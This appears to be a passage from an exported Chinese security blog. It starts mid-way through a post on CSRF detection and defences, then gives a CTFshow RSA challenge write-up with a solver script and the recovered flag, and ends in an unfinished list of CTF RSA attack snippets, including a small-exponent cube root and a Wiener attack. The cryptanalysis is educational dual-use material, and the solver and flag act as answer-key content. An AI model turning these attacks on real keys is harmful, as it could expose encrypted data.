<h1 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h1><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<p>随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。</p>
<h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><h2 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h2><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，而黑客伪造的链接或表单是在其它网站上的，所以我们可以判断Referer是否为自身网站。</p>
<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<h2 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h2><p>CSRF攻击的核心原理就是利用用户验证信息储存cookie中，发送请求，使得服务器无法判断真伪，而token之所以能够拦截，就是因为它是csrf攻击过程中几乎不可能伪造的东西。</p>
<p>实现原理：在服务端生成一个随机的token，加入到HTTP请求参数中，服务器拦截请求，查看发送的token和服务端的是否一致，若一致，则允许请求；若不一致，则拒绝请求。</p>
<p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
<p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
<h2 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h2><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
<p>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<h1 id="CSRF与XSS"><a href="#CSRF与XSS" class="headerlink" title="CSRF与XSS"></a>CSRF与XSS</h1><p>XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
<ul>
<li><p>CSRF：是利用网站A本身的漏洞，去请求网站A的api。</p>
</li>
<li><p>XSS：是向网站 A 注入 JS代码，然后执行 JS 里的代码，篡改网站A的内容。</p>
</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a href="https://blog.csdn.net/stpeace/article/details/53512283">CSRF攻击与防御</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/98062456">Web安全之CSRF攻击</a></p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
        <tag>web</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF show unusualrsa4</title>
    <url>/2020/09/17/ctf-show-unusualrsa4/</url>
    <content><![CDATA[<p>Lazzaro大佬出的题目，想了几天，也看了hint，还是没思路，在<a href="https://lazzzaro.github.io/">大佬的博客</a>里看了看wp，总算是搞明白了，tql</p>
<blockquote>
<p>原wp：<a href="https://lazzzaro.github.io/2020/09/01/other-CTFshow%E4%BE%9B%E9%A2%98-unusualrsa%E7%B3%BB%E5%88%97/">https://lazzzaro.github.io/2020/09/01/other-CTFshow供题-unusualrsa系列/</a></p>
</blockquote>
<span id="more"></span>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ********************</span>
<span class="token comment"># @Author: Lazzaro</span>
<span class="token comment"># ********************</span>

<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>bytes_to_long
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
<span class="token keyword">print</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">0x10001</span>
d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>

c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

<span class="token comment">#113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span>
<span class="token comment">#27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span>
<span class="token comment">#619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>已知题目给出了 $e$ , $d$, $invert(q,p)$, $c$ </p>
<p>hint:</p>
<pre class="line-numbers language-none"><code class="language-none">ed&#x3D;1+kφ
比较e与k比特位数
联立两式，尝试化简 (inv(q,p)·φ) mod p

费马小定理
对于任意 r,k1,k2，当 k2 为 k1 因子时，r mod k2&#x3D;(r mod k1) mod k2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ol>
<li><p>因为有 $ed = 1 + k(p - 1)(q - 1)$</p>
<p>所以 $\varphi(n)=(p-1)(q-1)=\frac{ed-1}{k}$</p>
<p>此处可以爆破k，得到 $\varphi(n)$</p>
<p>注：k与e同比特位，且爆破时应从大到小爆破</p>
</li>
<li><p>由invert(p,q)可知： $_pq\equiv 1\mod(p)$</p>
<script type="math/tex; mode=display">
\begin{eqnarray} 
\varphi(n)&=&(p-1)(q-1)
\\&=&pq-p-q+1
\\&=&n-p-q+1 
\end{eqnarray}</script><hr>
<script type="math/tex; mode=display">
\begin{eqnarray} 
{\_p*\varphi(n)}\mod(p)
&\equiv& {\_p(n-p-q+1)}\mod(p)\\ 
&\equiv& {(\_pn-\_pp-\_pq+\_p)}\mod(p)\\ 
&\equiv& {(0-0-1+\_p)}\mod(p) \\
&\equiv& {(-1+\_p)}\mod(p) 
\end{eqnarray}</script><p>所以有 ${_p*\varphi(n)+1-_p \equiv 0 \mod(p)}$</p>
<p>即 $x = _p*\varphi(n)+1-_p$ 能被 $p$ 整除</p>
</li>
<li><p>由费马小定理可知：存在任意 $r$ 满足 $r^{p-1} \equiv 1\mod(p)$</p>
<script type="math/tex; mode=display">
\begin{eqnarray} 
r^{\varphi(n)}
&\equiv& (r^{p-1})^{q-1}\\
&\equiv& 1^{q-1}\mod(p)\\
&\equiv& 1\mod(p)
\end{eqnarray}</script><p>又因为对于任意 $r,k_1,k_2$ ，当$k_2$为$k_1$的因子时，有</p>
<p>$r\mod(k_2)=(r\mod(k_1))\mod(k_1)$</p>
<p>所以 $r^{\varphi(n)}\mod(p)\equiv(r^{\varphi(n)}\mod x)\mod p\equiv kp+1$</p>
<p>例举 $r=2,3,4…$ 取最小公因数即为$p$</p>
</li>
<li><p>由 $_pq\equiv 1\mod p$ 可计算出 $q$ ，最后得到$m$</p>
</li>
</ol>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> libnum

e <span class="token operator">=</span> <span class="token number">0x10001</span>
d <span class="token operator">=</span> <span class="token number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">1000000</span> <span class="token operator">-</span> k<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># print(1000000 - k)</span>
		<span class="token keyword">break</span>
		
<span class="token comment"># k0 = 250704,125352,83568,62676,41784,31338,27856,20892,15669,13928,10446,6964,5223,3482,1741,144,72,48,36,24,18,16,12,9,8,6,4,3,2,1</span>
k0 <span class="token operator">=</span> <span class="token number">62676</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k0
<span class="token comment"># print(phi)</span>

_p <span class="token operator">=</span> <span class="token number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span>
x <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> _p <span class="token operator">*</span> phi <span class="token operator">-</span> _p
<span class="token comment"># print(x)</span>

y1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> phi<span class="token punctuation">,</span> x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
y2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> phi<span class="token punctuation">,</span> x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>

p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>y1<span class="token punctuation">,</span> y2<span class="token punctuation">)</span>
<span class="token comment"># print(p)</span>

q <span class="token operator">=</span> invert<span class="token punctuation">(</span>_p<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
c <span class="token operator">=</span> <span class="token number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;wh47_1f_y0u_kn0w_1nv3r7_q_p~?&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>RSA</tag>
        <tag>CTFshow</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中RSA的常见套路</title>
    <url>/2020/02/22/ctf-zhong-rsa-de-chang-jian-tao-lu/</url>
    <content><![CDATA[<p>当时学习RSA的时候感觉挺简单的，但一到做题时，就发现还有很多地方没有理解透，这里记录一下CTF中RSA的常见套路，参考来源：<a href="https://wiki.x10sec.org/crypto/introduction/">https://wiki.x10sec.org/crypto/introduction/</a><br><a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/index.html">https://err0rzz.github.io/2017/11/14/CTF中RSA套路/index.html</a><br>这里仅记录一些代码，具体解法还请参考：<a href="https://www.anquanke.com/post/id/84632">https://www.anquanke.com/post/id/84632</a><br>需要注意：关于gmpy2库的使用，可以参考<a href="https://www.cnblogs.com/pcat/p/5746821.html">https://www.cnblogs.com/pcat/p/5746821.html</a></p>
<span id="more"></span>
<h1 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h1><p>一般来说，RSA都围绕着c,m,d,n,p,q这几个参数展开，但不会给出全部，给出其中几个来求解。数据的给出也有以下几种方式：  </p>
<ul>
<li>txt文件：直接给出已知数据，分析求解</li>
<li>源文件：直接将加密的源文件给出，通过分析源代码，编写程序求解</li>
<li>pem文件：针对这类文件需要使用openssl来提取数据<pre class="line-numbers language-none"><code class="language-none">openssl rsa -pubin -text -modulus -in warmup -in public.pem
openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>pcap文件：针对这类文件可以使用wireshake follow一下。这种问题一般都是写了一个交互式crypto系统，可能产生多轮交互</li>
<li>ppc模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出</li>
</ul>
<h1 id="模数分解"><a href="#模数分解" class="headerlink" title="模数分解"></a>模数分解</h1><p>先说一说RSA中最简单最暴力的，直接分解n，一般给出的n不会太大</p>
<h2 id="已知n求p，q"><a href="#已知n求p，q" class="headerlink" title="已知n求p，q"></a>已知n求p，q</h2><ul>
<li>在线分解：<a href="http://www.factordb.com/">http://www.factordb.com/</a><br>通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q。此类问题一般是分值较小的题目，提取出n之后可以发现n的长度小于等于512bit，可以直接取分解n。如果大于512bit，建议在使用每个题目都用后面所说的方法去解题。</li>
<li>yafu分解：<a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a><br>下载解压后直接打开程序，输入factor(n)，n为要分解的数，即可</li>
<li>公约数分解n：一般这种是用于题目给出了两个及以上的n，可以使用这种方法来得到p和q，然后n1与n2的最大公因数就是p，再用n1或n2除以p就能得到q1或q2  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>
      a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a
    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
      temp <span class="token operator">=</span> a <span class="token operator">%</span> b
      a <span class="token operator">=</span> b
      b <span class="token operator">=</span> temp
    <span class="token keyword">return</span> a

p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
q1 <span class="token operator">=</span> n1<span class="token operator">/</span>p
q2 <span class="token operator">=</span> n2<span class="token operator">/</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
或者直接使用gmpy2库<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
q1 <span class="token operator">=</span> n1<span class="token operator">/</span>p
q2 <span class="token operator">=</span> n2<span class="token operator">/</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="已知e，p，q求d"><a href="#已知e，p，q求d" class="headerlink" title="已知e，p，q求d"></a>已知e，p，q求d</h2><p>一般e都是直接给出的，然后得到p和q之后，便可以求d<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>
    <span class="token keyword">if</span> g <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
      <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'modular inverse does not exist'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">return</span> x <span class="token operator">%</span> m

d <span class="token operator">=</span> modinv<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#或者使用gmpy2</span>
<span class="token keyword">import</span> gmpy2

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="已知c，d，n求m"><a href="#已知c，d，n求m" class="headerlink" title="已知c，d，n求m"></a>已知c，d，n求m</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h1><h2 id="e-3时的小明文攻击"><a href="#e-3时的小明文攻击" class="headerlink" title="e = 3时的小明文攻击"></a>e = 3时的小明文攻击</h2><p>识别：e=3时<br>如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。<br>如果明文的三次方虽然比n大，但是大不了多少，则可以爆破。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>n<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>n<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span>
  i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h2><p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。<br>这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。<br>（个人还没做到过）</p>
<h1 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h1><p>识别：简单来说，就是e非常大<br>GitHub上的开源攻击代码：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a><br>这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>   sys
sys<span class="token punctuation">.</span>setrecursionlimit<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ContinuedFractions<span class="token punctuation">,</span> Arithmetic<span class="token punctuation">,</span> RSAvulnerableKeyGenerator

<span class="token keyword">def</span> <span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Finds d knowing (e,n)
    applying the Wiener continued fraction attack
    '''</span>
    frac <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    convergents <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span>d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span>
        
        <span class="token comment">#check if d is actually the key</span>
        <span class="token keyword">if</span> k<span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            phi <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>k
            s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token comment"># check if the equation x^2 - s*x + n = 0</span>
            <span class="token comment"># has integer roots</span>
            discr <span class="token operator">=</span> s<span class="token operator">*</span>s <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span>n
            <span class="token keyword">if</span><span class="token punctuation">(</span>discr<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                t <span class="token operator">=</span> Arithmetic<span class="token punctuation">.</span>is_perfect_square<span class="token punctuation">(</span>discr<span class="token punctuation">)</span>
                <span class="token keyword">if</span> t<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hacked!"</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span> d

